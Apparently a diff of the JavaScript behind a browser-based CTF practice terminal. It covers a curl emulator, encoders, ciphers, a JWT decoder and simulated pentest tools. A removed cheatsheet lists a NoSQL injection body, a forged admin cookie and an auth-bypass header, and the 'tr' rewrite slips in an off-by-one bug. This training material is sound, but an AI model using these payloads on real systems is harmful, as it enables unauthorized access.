+        theme: { background: '#11111b', foreground: '#cdd6f4', cursor: '#f5e0dc', cursorAccent: '#1e1e2e', selectionBackground: 'rgba(203,166,247,0.25)', black:'#45475a', red:'#f38ba8', green:'#a6e3a1', yellow:'#f9e2af', blue:'#89b4fa', magenta:'#cba6f7', cyan:'#89dceb', white:'#bac2de' },
+        fontFamily: "'Share Tech Mono', 'Courier New', monospace", fontSize: 14, lineHeight: 1.5,
+        cursorBlink: true, cursorStyle: 'block', scrollback: 5000, allowTransparency: true,
+    });
     const fitAddon = new FitAddon.FitAddon();
     term.loadAddon(fitAddon);
     term.open(document.getElementById('terminal'));
     fitAddon.fit();
     window.addEventListener('resize', () => fitAddon.fit());
 
-    // ── Boot sequence ──
+    // ── 4. BOOT SEQUENCE ──
     function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
     (async () => {
-        for (const l of BOOT) { term.writeln(l); await sleep(35); }
-        // ── Restore background from localStorage ──
-        applyStoredBg();
-        // ── First-time tutorial ──
-        if (!localStorage.getItem('bxf_term_tut_v1')) {
-            await sleep(500);
-            pendingAsync = true;
-            await termTutorial();
-        } else {
-            const xFiles = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
-            if (xFiles > 0) {
-                term.writeln('\x1b[35m[SESSION RESTORED]\x1b[0m \x1b[90mWelcome back — ' + xFiles + ' custom file(s) loaded.\x1b[0m');
+        try {
+            for (const l of BOOT) { term.writeln(l); await sleep(35); }
+            applyStoredBg();
+            if (!localStorage.getItem('bxf_term_tut_v1')) {
+                await sleep(500); pendingAsync = true; await termTutorial();
+            } else {
+                const xFiles = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
+                if (xFiles > 0) term.writeln('\x1b[35m[SESSION RESTORED]\x1b[0m \x1b[90mWelcome back — ' + xFiles + ' custom file(s) loaded.\x1b[0m');
+                term.write(PROMPT);
             }
-            term.write(PROMPT);
-        }
+        } catch (err) { console.error('[BOOT ERROR]', err); term.write(PROMPT); }
     })();
 
-    // ══════════════════════════════════════════════════════════
-    //  INPUT HANDLER
-    // ══════════════════════════════════════════════════════════
+    // ── 5. INPUT & INTERACTION HANDLERS ──
     term.onKey(({ key, domEvent }) => {
         if (pendingAsync) return;
         const c = domEvent.keyCode;
-
-        if (c === 13) { // Enter
-            term.write('\r\n');
-            const cmd = inputBuffer.trim();
-            inputBuffer = ''; historyIdx = -1;
+        if (c === 13) {
+            term.write('\r\n'); const cmd = inputBuffer.trim(); inputBuffer = ''; historyIdx = -1;
             if (cmd) {
-                if (cmdHistory[0] !== cmd) {
-                    cmdHistory.unshift(cmd);
-                    if (cmdHistory.length > 200) cmdHistory.pop();
-                    localStorage.setItem('bxf_term_hist', JSON.stringify(cmdHistory.slice(0,200)));
-                }
+                if (cmdHistory[0] !== cmd) { cmdHistory.unshift(cmd); if (cmdHistory.length > 200) cmdHistory.pop(); localStorage.setItem('bxf_term_hist', JSON.stringify(cmdHistory.slice(0,200))); }
                 runCommand(cmd);
-            } else { term.write(PROMPT); }
-
-        } else if (c === 8) { // Backspace
-            if (inputBuffer.length) { inputBuffer = inputBuffer.slice(0,-1); term.write('\b \b'); }
-
-        } else if (c === 9) { // Tab
-            domEvent.preventDefault();
-            handleTab();
-
-        } else if (c === 38) { // Up
-            if (historyIdx < cmdHistory.length - 1) { historyIdx++; replaceInput(cmdHistory[historyIdx]); }
-
-        } else if (c === 40) { // Down
-            if (historyIdx > 0) { historyIdx--; replaceInput(cmdHistory[historyIdx]); }
-            else if (historyIdx === 0) { historyIdx = -1; replaceInput(''); }
-
-        } else if (c === 76 && domEvent.ctrlKey) { termClear(); }
-        else if (c === 67 && domEvent.ctrlKey) {
-            term.writeln('^C'); inputBuffer = ''; term.write(PROMPT);
-        } else if (c === 85 && domEvent.ctrlKey) {
-            term.write('\b \b'.repeat(inputBuffer.length)); inputBuffer = '';
-        } else if (key && !domEvent.ctrlKey && !domEvent.altKey && !domEvent.metaKey) {
-            inputBuffer += key; term.write(key);
-        }
+            } else term.write(PROMPT);
+        } else if (c === 8) { if (inputBuffer.length) { inputBuffer = inputBuffer.slice(0,-1); term.write('\b \b'); } }
+        else if (c === 9) { domEvent.preventDefault(); handleTab(); }
+        else if (c === 38) { if (historyIdx < cmdHistory.length - 1) { historyIdx++; replaceInput(cmdHistory[historyIdx]); } }
+        else if (c === 40) { if (historyIdx > 0) { historyIdx--; replaceInput(cmdHistory[historyIdx]); } else if (historyIdx === 0) { historyIdx = -1; replaceInput(''); } }
+        else if (c === 76 && domEvent.ctrlKey) { termClear(); }
+        else if (c === 67 && domEvent.ctrlKey) { term.writeln('^C'); inputBuffer = ''; term.write(PROMPT); }
+        else if (key && !domEvent.ctrlKey && !domEvent.altKey && !domEvent.metaKey) { inputBuffer += key; term.write(key); }
     });
 
-    function replaceInput(text) {
-        term.write('\b \b'.repeat(inputBuffer.length));
-        inputBuffer = text; term.write(text);
-    }
-
-    // ══════════════════════════════════════════════════════════
-    //  TAB COMPLETION
-    // ══════════════════════════════════════════════════════════
+    function replaceInput(text) { term.write('\b \b'.repeat(inputBuffer.length)); inputBuffer = text; term.write(text); }
     function handleTab() {
         const parts = inputBuffer.trim().split(/\s+/);
         if (parts.length <= 1) {
-            const prefix = parts[0] || '';
-            const matches = ALL_COMMANDS.filter(c => c.startsWith(prefix));
-            if (matches.length === 1) {
-                replaceInput(matches[0] + ' ');
-            } else if (matches.length > 1) {
-                term.writeln('');
-                const cols = Math.floor(76 / 16);
-                for (let i = 0; i < matches.length; i += cols)
-                    term.writeln(matches.slice(i, i+cols).map(m => m.padEnd(16)).join(''));
-                const common = lcPrefix(matches);
-                if (common.length > prefix.length) replaceInput(common);
-                else term.write(PROMPT + inputBuffer);
-            }
+            const prefix = parts[0] || ''; const matches = ALL_COMMANDS.filter(c => c.startsWith(prefix));
+            if (matches.length === 1) replaceInput(matches[0] + ' ');
+            else if (matches.length > 1) { term.writeln(''); matches.forEach(m => term.write(m.padEnd(16))); term.write(PROMPT + inputBuffer); }
         } else {
-            const partial = parts[parts.length-1];
-            const files = Object.keys(VFILES);
-            const matches = files.filter(f => f.startsWith(partial));
+            const partial = parts[parts.length-1]; const files = Object.keys(VFILES); const matches = files.filter(f => f.startsWith(partial));
             if (matches.length === 1) replaceInput([...parts.slice(0,-1), matches[0]].join(' '));
             else if (matches.length > 1) { term.writeln(''); term.writeln(matches.join('  ')); term.write(PROMPT + inputBuffer); }
         }
@@ -619,6 +596,7 @@
                 case 'python3':
                 case 'python':
                 case 'py':        termPython(raw, parts); break;
+                case 'man':       termMan(parts); break;
                 case 'xor':       termXor(parts); break;
                 case 'morse':     termMorse(parts); break;
                 case 'binary':    { const s=parts[1],v=parts.slice(2).join(' '); if(s==='to')pl([...v].map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ')); else if(s==='from')pl(v.split(/\s+/).map(b=>String.fromCharCode(parseInt(b,2))).join('')); else pe('binary: Usage: binary to <text> | binary from <bits>'); break; }
@@ -654,53 +632,27 @@
                 case 'nano':      termNano(parts); break;
 
                 // ── Recon / Network ──
+                case 'neofetch':  termNeofetch(); break;
+                case 'env':       Object.entries(ENV).forEach(([k,v]) => pl(`${k}=${v}`)); break;
+                case 'set':       termSet(parts); break;
                 case 'whois':     await termWhois(parts); break;
                 case 'ping':      termPing(parts); break;
                 case 'traceroute':termTraceroute(parts); break;
-                case 'host':      pe(`host: try \x1b[33mcurl "https://dns.google/resolve?name=${parts[1]||'TARGET'}&type=A"\x1b[0m`); break;
-
-                // ── Security tools (simulated) ──
-                case 'burpsuite':
                 case 'burp':      termBurp(parts); break;
                 case 'sqlmap':    termSqlmap(parts); break;
                 case 'ffuf':
                 case 'gobuster':
                 case 'dirb':      termFuzz(cmd, parts); break;
                 case 'hydra':     termHydra(parts); break;
-                case 'john':
-                case 'hashcat':   termCrack(cmd, parts); break;
-                case 'binwalk':
-                case 'foremost':  termBinwalk(cmd, parts); break;
+                case 'hashcat':
+                case 'john':      termCrack(cmd, parts); break;
+                case 'binwalk':   termBinwalk(cmd, parts); break;
                 case 'steghide':
                 case 'zsteg':
                 case 'stegsolve': termSteg(cmd, parts); break;
                 case 'exiftool':  termExif(parts); break;
-                case 'neofetch':  termNeofetch(); break;
-
-                // ── System info stubs ──
-                case 'ps':        pl('\x1b[36m  PID TTY          TIME CMD\x1b[0m\n    1 pts/0   00:00:00 zsh\n  42 pts/0   00:00:00 terminal.js\n  99 pts/0   00:00:00 ps'); break;
-                case 'ifconfig':  pl('\x1b[36mlo:\x1b[0m flags=73  inet 127.0.0.1  netmask 255.0.0.0\n\x1b[36meth0:\x1b[0m flags=4163  inet 10.0.2.15  netmask 255.255.255.0  (browser sandbox)'); break;
-                case 'netstat':   pl('\x1b[33mNetstat is sandboxed. Try:\x1b[0m curl -I <target>'); break;
-                case 'man':       pl(`\x1b[35mman:\x1b[0m No manual entry for \x1b[33m${parts[1]||'?'}\x1b[0m in browser. Try \x1b[36mhelp\x1b[0m`); break;
-
-                // ── Misc ──
-                case 'file':      pl(`${parts[1]||'?'}: data (browser sandbox — no real filesystem)`); break;
-                case 'zip':
-                case 'unzip':
-                case 'tar':
-                case 'gzip':
-                case 'bzip2':     pe(`${cmd}: archive tools unavailable in browser sandbox.`); break;
-                case 'ssh':
-                case 'ftp':
-                case 'telnet':    pe(`${cmd}: raw socket connections are blocked in browsers. Use \x1b[33mcurl\x1b[0m for HTTP.`); break;
-
-                case 'nmap':
-                case 'nc':
-                case 'netcat':    pe(`${cmd}: not available in browser. Use \x1b[33mcurl\x1b[0m for HTTP recon.`); break;
-                case 'nslookup':
-                case 'dig':       pe(`${cmd}: try \x1b[33mcurl "https://dns.google/resolve?name=TARGET&type=A"\x1b[0m`); break;
                 case 'exit':
-                case 'quit':      window.location.href='/ctf.html'; return;
+                case 'quit':      window.location.href='ctf.html'; return;
                 case '':          break;
                 default:
                     if (!raw.startsWith('#')) pe(`${cmd}: command not found. Type \x1b[33mhelp\x1b[0m for commands.`);
@@ -711,18 +663,13 @@
         }
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HTTP
-    // ══════════════════════════════════════════════════════════
     async function termCurl(raw, parts) {
         let method='GET', url=null, headers={}, body=null, verbose=false, silent=false;
-        let i=1;
-        while(i<parts.length) {
+        let i=1; while(i<parts.length) {
             const a=parts[i];
             if(['-X','--request'].includes(a)) method=parts[++i]?.toUpperCase()||'GET';
             else if(['-H','--header'].includes(a)) { const h=parts[++i]||'',c=h.indexOf(':'); if(c>0) headers[h.slice(0,c).trim()]=h.slice(c+1).trim(); }
-            else if(['-d','--data','--data-raw'].includes(a)) { body=parts[++i]; if(method==='GET') method='POST'; }
-            else if(['--json'].includes(a)) { body=parts[++i]; headers['Content-Type']='application/json'; if(method==='GET') method='POST'; }
+            else if(['-d','--data','--data-raw','--json'].includes(a)) { body=parts[++i]; headers['Content-Type']=a==='--json'?'application/json':'application/x-www-form-urlencoded'; if(method==='GET') method='POST'; }
             else if(['-b','--cookie'].includes(a)) headers['Cookie']=parts[++i]||'';
             else if(['-A','--user-agent'].includes(a)) headers['User-Agent']=parts[++i]||'';
             else if(['-u','--user'].includes(a)) headers['Authorization']='Basic '+btoa(parts[++i]||'');
@@ -735,16 +682,14 @@
         if(!url){pe('curl: no URL. Usage: curl [options] <url>');return;}
         if(!url.match(/^https?:\/\//)) url='https://'+url;
         if(!silent) pl(`\x1b[90m> ${method} ${url}\x1b[0m`);
-        if(verbose) { Object.entries(headers).forEach(([k,v])=>pl(`\x1b[36m> ${k}: ${v}\x1b[0m`)); if(body) pl(`\x1b[36m> Body: ${body}\x1b[0m`); }
-        const opts={method,headers,redirect:'follow'};
-        if(body) opts.body=body;
+        const opts={method,headers,redirect:'follow'}; if(body) opts.body=body;
         try {
             const t0=Date.now(),res=await fetch(url,opts),ms=Date.now()-t0;
-            const text=method!=='HEAD'?await res.text():'';
+            const text=method!=='HEAD'?(await res.text()):'';
             if(!silent) pl(`\x1b[90m< HTTP/${res.status} ${res.statusText} (${ms}ms)\x1b[0m`);
             if(verbose) res.headers.forEach((v,k)=>pl(`\x1b[90m< ${k}: ${v}\x1b[0m`));
             if(text) { try{printJson(JSON.parse(text));}catch{text.split('\n').forEach(l=>pl(l));} }
-        } catch(e) { pe(`curl: Failed to connect.\n${e.message}\n\x1b[33mNote: CORS may block cross-origin requests.\x1b[0m`); }
+        } catch(e) { pe(`curl: failed (${e.message}). CORS may block this.`); }
     }
 
     async function termHTTP(parts) {
@@ -754,34 +699,13 @@
         await termCurl('',['curl','-X',method,...(body?['-d',body]:[]),url]);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  ENCODING
-    // ══════════════════════════════════════════════════════════
     function termBase64(parts) {
         const d=parts.includes('-d')||parts.includes('--decode');
         const inp=parts.find(p=>!p.startsWith('-')&&p!=='base64');
         if(!inp){pe('base64: Usage: base64 [-d] <text>');return;}
         try{pl(d?atob(inp):btoa(inp));}catch(e){pe('base64: '+e.message);}
     }
-    function rot(s,n) {
-        return s.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(((c.charCodeAt(0)-b+n)%26+26)%26+b);});
-    }
-    function termCaesar(parts) {
-        const n=parseInt(parts[1]),t=parts.slice(2).join(' ');
-        if(isNaN(n)||!t){pe('caesar: Usage: caesar <n> <text>');return;}
-        pl(rot(t,n));
-    }
-    function termVigenere(parts) {
-        const d=parts.includes('-d');
-        const args=parts.filter(p=>!p.startsWith('-')&&p!=='vigenere');
-        const key=(args[0]||'').toUpperCase(), text=args.slice(1).join(' ');
-        if(!key||!text){pe('vigenere: Usage: vigenere [-d] <key> <text>');return;}
-        let ki=0,out='';
-        for(const c of text) {
-            if(/[a-zA-Z]/.test(c)){const b=c<='Z'?65:97,s=c.charCodeAt(0)-b,k=key[ki%key.length].charCodeAt(0)-65,r=d?((s-k+26)%26):(s+k)%26;out+=String.fromCharCode(r+b);ki++;}else out+=c;
-        }
-        pl(out);
-    }
+
     function termDecode(parts) {
         const type=(parts[1]||'').toLowerCase(),val=parts.slice(2).join(' ');
         if(!type||!val){pe('decode: Usage: decode <base64|hex|url|rot13|binary|octal|html|unicode> <val>');return;}
@@ -797,6 +721,7 @@
             default:pe(`decode: unknown type '${type}'`);
         }
     }
+
     function termEncode(parts) {
         const type=(parts[1]||'').toLowerCase(),val=parts.slice(2).join(' ');
         if(!type||!val){pe('encode: Usage: encode <base64|hex|url|binary|html|unicode> <val>');return;}
@@ -811,9 +736,6 @@
         }
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HASHING
-    // ══════════════════════════════════════════════════════════
     async function termHash(parts) {
         const algo=(parts[1]||'').toUpperCase(),text=parts.slice(2).join(' ');
         if(!algo||!text){pe('hash: Usage: hash <sha256|sha1|sha512> <text>');return;}
@@ -826,9 +748,6 @@
         }catch(e){pe('hash: '+e.message);}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HEX / TEXT ANALYSIS
-    // ══════════════════════════════════════════════════════════
     function termHexdump(parts) {
         const t=parts.slice(1).join(' ');if(!t){pe('xxd: Usage: xxd <text>');return;}
         for(let i=0;i<t.length;i+=16){
@@ -838,6 +757,7 @@
             pl(`\x1b[90m${i.toString(16).padStart(8,'0')}\x1b[0m  ${hex.padEnd(47)}  \x1b[32m${asc}\x1b[0m`);
         }
     }
+
     function termGrep(parts) {
         const inv=parts.includes('-v'),ic=parts.includes('-i');
         const args=parts.filter(p=>!p.startsWith('-')&&p!=='grep');
@@ -846,22 +766,21 @@
         const re=new RegExp(pat,ic?'gi':'g');
         text.split('\n').forEach(l=>{const m=re.test(l);re.lastIndex=0;if(m!==inv)pl(l);});
     }
+
     function termCut(parts) {
         const d=parts.find(p=>p.startsWith('-d'))?.slice(2)||'\t';
         const f=parseInt(parts.find(p=>p.startsWith('-f'))?.slice(2)||'1')-1;
         const text=parts.filter(p=>!p.startsWith('-')&&p!=='cut').join(' ');
         text.split('\n').forEach(l=>pl(l.split(d)[f]||''));
     }
+
     function termTr(parts) {
         const from=parts[1]||'',to=parts[2]||'',text=parts.slice(3).join(' ');
         if(!from||!text){pe('tr: Usage: tr <from> <to> <text>');return;}
-        let out='';for(const c of text){const i=from.indexOf(c);out+=i>=0&&i<to.length?to[i]:i>=0?'':c;}
+        let out='';for(const c of text){const i=from.indexOf(c);out+=i>0&&i<to.length?to[i]:i>=0?'':c;}
         pl(out);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  CIPHERS
-    // ══════════════════════════════════════════════════════════
     function termXor(parts) {
         const text=parts[1],key=parts[2];
         if(!text||!key){pe('xor: Usage: xor <hex_data> <hex_key>  OR  xor <text> <key>');return;}
@@ -876,8 +795,6 @@
         }
     }
 
-    const MORSE={A:'.-',B:'-...',C:'-.-.',D:'-..','E':'.','F':'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.'};
-    const MORSED=Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v,k]));
     function termMorse(parts) {
         const d=parts.includes('-d');
         const text=parts.filter(p=>!p.startsWith('-')&&p!=='morse').join(' ').toUpperCase();
@@ -886,9 +803,6 @@
         else pl(text.split(' ').map(c=>MORSE[c]||c).join(' '));
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  JWT
-    // ══════════════════════════════════════════════════════════
     function termJWT(parts) {
         const jwt=parts[1];if(!jwt){pe('jwt: Usage: jwt <token>');return;}
         const p=jwt.split('.');if(p.length!==3){pe('jwt: invalid token (need 3 parts)');return;}
@@ -902,9 +816,6 @@
         }catch(e){pe('jwt: '+e.message);}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  ANALYSIS
-    // ══════════════════════════════════════════════════════════
     function termFreq(parts) {
         const text=parts.slice(1).join(' ').toLowerCase().replace(/[^a-z]/g,'');
         if(!text){pe('freq: Usage: freq <text>');return;}
@@ -918,6 +829,7 @@
         });
         pl(`\nLength: ${text.length} chars`);
     }
+
     function termEntropy(parts) {
         const text=parts.slice(1).join(' ');if(!text){pe('entropy: no input');return;}
         const f={};for(const c of text)f[c]=(f[c]||0)+1;
@@ -927,6 +839,7 @@
         if(ent>7.5)pl('\x1b[90mHigh entropy — likely encrypted/compressed.\x1b[0m');
         else if(ent<3)pl('\x1b[90mLow entropy — likely plain text.\x1b[0m');
     }
+
     function termAsciiTable() {
         pl('\x1b[33mDec  Hex  Chr     Dec  Hex  Chr     Dec  Hex  Chr\x1b[0m');
         for(let i=32;i<128;i+=3){
@@ -935,9 +848,6 @@
         }
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  BRAINFUCK
-    // ══════════════════════════════════════════════════════════
     function termBrainfuck(parts) {
         const code=parts.slice(1).join(' ').replace(/[^><+\-.,\[\]]/g,'');
         if(!code){pe('brainfuck: Usage: brainfuck <code>');return;}
@@ -957,9 +867,6 @@
         if(steps>=1e6)pe('[!] Execution limit (1M steps)');
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  TIMESTAMP
-    // ══════════════════════════════════════════════════════════
     function termTimestamp(parts) {
         const val=parts[1];
         if(!val||val==='now'){const d=new Date();pl(`Unix:  ${Math.floor(d/1000)}\nUTC:   ${d.toUTCString()}\nLocal: ${d.toLocaleString()}`);return;}
@@ -968,15 +875,14 @@
         else{const d=new Date(val);pl(isNaN(d)?`Can't parse '${val}'`:`Unix: ${Math.floor(d/1000)}\nUTC:  ${d.toUTCString()}`);}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  RSA & MATH
-    // ══════════════════════════════════════════════════════════
     function modpow(base,exp,mod){let r=1n;base=base%mod;while(exp>0n){if(exp%2n===1n)r=r*base%mod;exp>>=1n;base=base*base%mod;}return r;}
+
     function termRSA(parts) {
         const op=parts[1],a=BigInt(parts[2]||0),e=BigInt(parts[3]||0),n=BigInt(parts[4]||0);
         if(!op){pe('rsa: Usage: rsa <encrypt|decrypt> <msg> <e> <n>');return;}
         try{pl(`Result: \x1b[33m${modpow(a,e,n)}\x1b[0m`);}catch(err){pe('rsa: '+err.message);}
     }
+
     function termExtGCD(parts) {
         const a=parseInt(parts[1]),b=parseInt(parts[2]);
         if(isNaN(a)||isNaN(b)){pe('extgcd: Usage: extgcd <a> <b>');return;}
@@ -985,6 +891,7 @@
         pl(`gcd(${a},${b}) = \x1b[33m${g}\x1b[0m\n${a}*${x} + ${b}*${y} = ${g}`);
         if(g===1)pl(`\x1b[33m${a}\x1b[0m is invertible mod ${b}: inverse = \x1b[32m${((x%b)+b)%b}\x1b[0m`);
     }
+
     function termPrimes(parts) {
         const n=parseInt(parts[1]||100);if(n>10000){pe('primes: max 10000');return;}
         const sieve=new Array(n+1).fill(true);sieve[0]=sieve[1]=false;
@@ -994,10 +901,6 @@
         for(let i=0;i<primes.length;i+=15)pl(primes.slice(i,i+15).join('  '));
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  FLAGS / ENV
-    // ══════════════════════════════════════════════════════════
-    const savedFlags=JSON.parse(localStorage.getItem('bxf_flags')||'{}');
     function termFlag(parts) {
         const sub=parts[1];
         if(sub==='save'){
@@ -1013,81 +916,48 @@
             localStorage.removeItem('bxf_flags'); pl('Flags cleared.');
         }else pe('flag: Usage: flag <save|list|clear>');
     }
-    // ── ENV: persist across sessions ──
-    const _savedEnv = JSON.parse(localStorage.getItem('bxf_env') || 'null');
-    const ENV = _savedEnv || {TARGET:'https://breakersfixer-api.onrender.com',HOME:'/home/entity',USER:'entity'};
-    function _saveEnv() { localStorage.setItem('bxf_env', JSON.stringify(ENV)); }
+
     function termSet(parts) {
         if(parts.length===1){Object.entries(ENV).forEach(([k,v])=>pl(`${k}=${v}`));return;}
         const eq=parts[1].indexOf('=');if(eq<0){pe('set: Usage: set KEY=VALUE');return;}
         ENV[parts[1].slice(0,eq)]=parts[1].slice(eq+1); _saveEnv(); pl(`Set ${parts[1]}`);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  PYTHON
-    // ══════════════════════════════════════════════════════════
     function termPython(raw, parts) {
-        if(parts[1]!=='-c'){pe('python3 REPL not available.\nUse: python3 -c "<code>"\nExample: python3 -c "print(chr(65))"');return;}
-        let code=parts.slice(2).join(' ');
+        if(parts[1]!=='-c'){pe('python3: REPL unavailable. Use: python3 -c "<code>"');return;}
+        let code=parts.slice(2).join(' ').replace(/^["']|["']$/g,'');
         try{
             const blt={
-                print:(...a)=>{a.forEach(x=>pl(String(x)));},
-                len:v=>v.length,
-                range:(...a)=>{const r=[];const[s,e,st]=a.length===1?[0,a[0],1]:a.length===2?[...a,1]:a;for(let i=s;i<e;i+=st)r.push(i);return r;},
-                int:(v,b)=>b?parseInt(v,b):parseInt(v),
-                hex:v=>'0x'+v.toString(16), oct:v=>'0o'+v.toString(8), bin:v=>'0b'+v.toString(2),
-                chr:v=>String.fromCharCode(v), ord:v=>v.charCodeAt(0),
-                str:v=>String(v), list:v=>Array.from(v),
-                sum:v=>v.reduce((a,b)=>a+b,0),
-                max:(...a)=>Math.max(...(a.length===1?a[0]:a)),
-                min:(...a)=>Math.min(...(a.length===1?a[0]:a)),
-                abs:Math.abs, round:Math.round,
-                pow:(b,e,m)=>m?Number(modpow(BigInt(b),BigInt(e),BigInt(m))):Math.pow(b,e),
-                zip:(...a)=>a[0].map((_,i)=>a.map(x=>x[i])),
-                enumerate:(a,s=0)=>a.map((v,i)=>[i+s,v]),
-                True:true, False:false, None:null,
+                print:(...a)=>pl(a.join(' ')), len:v=>v.length, range:(s,e,st)=>{if(e===undefined){e=s;s=0;}st=st||1;const r=[];for(let i=s;i<e;i+=st)r.push(i);return r;},
+                int:(v,b)=>parseInt(v,b||10), hex:v=>'0x'+BigInt(v).toString(16), bin:v=>'0b'+BigInt(v).toString(2), chr:v=>String.fromCharCode(v), ord:v=>v.charCodeAt(0),
+                str:v=>String(v), list:v=>Array.from(v), pow:(b,e,m)=>m?modpow(BigInt(b),BigInt(e),BigInt(m)):BigInt(Math.pow(Number(b),Number(e))),
+                bytes:{ fromhex:s=>([...(s.replace(/\s+/g,'').match(/.{2}/g)||[])].map(h=>parseInt(h,16))) },
+                base64:{ b64encode:v=>btoa(v), b64decode:v=>atob(v) },
+                struct:{ pack:(f,v)=>{if(f==='<Q'){let b=new Uint8Array(8);for(let i=0;i<8;i++)b[i]=Number((BigInt(v)>>(BigInt(i)*8n))&0xFFn);return Array.from(b).map(x=>'\\x'+x.toString(16).padStart(2,'0')).join('');} return '';}}
             };
-            code=code
-                .replace(/\bTrue\b/g,'true').replace(/\bFalse\b/g,'false').replace(/\bNone\b/g,'null')
-                .replace(/f"([^"]*)"/g,(_,t)=>'`'+t.replace(/\{([^}]+)\}/g,'${$1}')+'`')
-                .replace(/f'([^']*)'/g,(_,t)=>'`'+t.replace(/\{([^}]+)\}/g,'${$1}')+'`');
-            new Function(...Object.keys(blt),`"use strict";${code}`)(...Object.values(blt));
+            const fullCode = `"use strict";\n${code.replace(/True/g,'true').replace(/False/g,'false').replace(/None/g,'null')}`;
+            new Function(...Object.keys(blt), fullCode)(...Object.values(blt));
         }catch(e){pe('python3: '+e.message);}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  VIRTUAL FS
-    // ══════════════════════════════════════════════════════════
-    const _VFILES_DEFAULT = {
-        'README.txt':['# BXF CTF TERMINAL v4.1','','Type help for commands.','challenges — list retos    solve <ID> — walkthrough','cat cheatsheet.txt — full cheatsheet'],
-        'notes.txt':['# My CTF Notes','# Use: echo "text" >> notes.txt'],
-        'cheatsheet.txt':[
-            '# CTF QUICK REFERENCE','',
-            '## Encoding','  rot13 <text>','  vigenere <key> <ct>','  base64 -d <b64>','  xor <hex> <key>','  decode hex <hexstr>','',
-            '## HTTP','  curl -H "X-Admin-Auth: enabled" <url>','  curl -X POST -d "{\"user\":{\"$ne\":\"\"}}" <url>','  curl -b "role=admin" <url>','',
-            '## Crypto','  hash sha256 <text>','  jwt <token>','  rsa --n N --e E --c C','  primes N','  extgcd A B','',
-            '## CTF Workflow','  challenges — list all','  ctf web — filter by cat','  solve <ID> — walkthrough','',
-            '## Files','  echo "text" >> notes.txt','  cat notes.txt','  ls   touch file   rm file',
-        ],
-        '.bash_history':['challenges','solve S1M02','rot13 "cvs{ebg13_vf_pynffvp}"','hash sha256 password123','curl https://breakersfixer-api.onrender.com/'],
+    const MAN_PAGES = {
+        'curl': ['NAME','     curl - transfer a URL','','SYNOPSIS','     curl [options] [URL...]','','DESCRIPTION','     In this terminal, curl is a simulated HTTP engine that sends','     real network requests via the browser Fetch API.','','OPTIONS','     -X <method>  Specify request method (GET, POST, etc.)','     -H <header>  Pass custom header to server','     -d <data>    HTTP POST data','     -b <cookie>  Send cookies provided as string','     -v           Make the operation more talkative','     -s           Silent mode'],
+        'python3': ['NAME','     python - an interpreted, interactive, object-oriented programming language','','SYNOPSIS','     python3 -c "<code>"','','DESCRIPTION','     Simulated Python 3.12 environment with CTF-specific built-ins.','     Supported: print, len, range, int, hex, bin, bytes.fromhex,','     base64.b64decode/encode, struct.pack(\'<Q\', v).'],
+        'solve': ['NAME','     solve - start a challenge walkthrough','','SYNOPSIS','     solve <ID>','','DESCRIPTION','     Starts an interactive, step-by-step walkthrough for the','     specified challenge. Each step provides a command for you','     to try in the terminal.'],
+        'jwt': ['NAME','     jwt - JSON Web Token tool','','SYNOPSIS','     jwt <token>','','DESCRIPTION','     Tool for decoding and forging JWTs. Default behavior','     decodes a token and displays its header and payload.'],
     };
-    const _savedVF = localStorage.getItem('bxf_vfiles');
-    const VFILES = _savedVF ? Object.assign({}, _VFILES_DEFAULT, JSON.parse(_savedVF)) : {..._VFILES_DEFAULT};
-    function _saveVFiles() {
-        const saved = {};
-        for (const [k,v] of Object.entries(VFILES)) {
-            if (!_VFILES_DEFAULT[k] || JSON.stringify(v) !== JSON.stringify(_VFILES_DEFAULT[k])) saved[k] = v;
-        }
-        localStorage.setItem('bxf_vfiles', JSON.stringify(saved));
+    function termMan(parts) {
+        const cmd=parts[1];if(!cmd){pe('What manual page do you want?');return;}
+        const p=MAN_PAGES[cmd];if(!p){pe(`No manual entry for ${cmd}`);return;}
+        pl(`\x1b[1m\x1b[35mBXF MANUAL: ${cmd.toUpperCase()}(1)\x1b[0m`);
+        p.forEach(l=>pl('    '+l));
     }
+
     function termCat(parts) {
         const f=parts.slice(1).join(' ');if(!f){pe('cat: missing file');return;}
         const c=VFILES[f];if(c)c.forEach(l=>pl(l));else pe(`cat: ${f}: No such file or directory`);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HELP
-    // ══════════════════════════════════════════════════════════
     function termHelp() {
         const h=[
             '','╔══════════ BXF CTF TERMINAL — COMMAND REFERENCE ═══════════╗','',
@@ -1096,19 +966,11 @@
             '  \x1b[36mcurl\x1b[0m -X POST -d "data" <url>  POST',
             '  \x1b[36mcurl\x1b[0m -H "Key: Val" <url>       Custom header',
             '  \x1b[36mcurl\x1b[0m -b "cookie=x" <url>       Cookie',
-            '  \x1b[36mcurl\x1b[0m -A "Bot/1.0" <url>        User-Agent',
-            '  \x1b[36mcurl\x1b[0m -u "user:pass" <url>      Basic auth',
             '  \x1b[36mcurl\x1b[0m -v <url>                  Verbose + headers',
-            '  \x1b[36mcurl\x1b[0m -I <url>                  HEAD only',
             '',
             '\x1b[33m── ENCODING ──────────────────────────────────────────────────\x1b[0m',
